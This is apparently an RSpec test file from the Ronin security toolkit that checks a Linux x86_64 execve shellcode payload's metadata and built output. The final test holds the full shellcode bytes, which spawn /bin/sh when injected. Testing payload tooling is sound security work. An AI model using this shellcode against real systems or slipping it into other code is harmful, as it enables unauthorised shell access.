require 'spec_helper'
require 'ronin/payloads/builtin/shellcode/linux/x86_64/execve'

describe Ronin::Payloads::Shellcode::Linux::X86_64::Execve do
  it "must inherit from Ronin::Payloads::ShellcodePayload" do
    expect(described_class).to be < Ronin::Payloads::ShellcodePayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'shellcode/linux/x86_64/execve'" do
      expect(subject.id).to eq('shellcode/linux/x86_64/execve')
    end
  end

  describe ".arch" do
    subject { described_class }

    it "must equal :x86_64" do
      expect(subject.arch).to be(:x86_64)
    end
  end

  describe ".os" do
    subject { described_class }

    it "must equal :linux" do
      expect(subject.os).to be(:linux)
    end
  end

  describe "#build" do
    before { subject.build }

    it "must set #payload" do
      expect(subject.payload).to eq(
        "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05".b
      )
    end

    it "must ensure #payload is an ASCII 8bit string" do
      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
    end
  end
end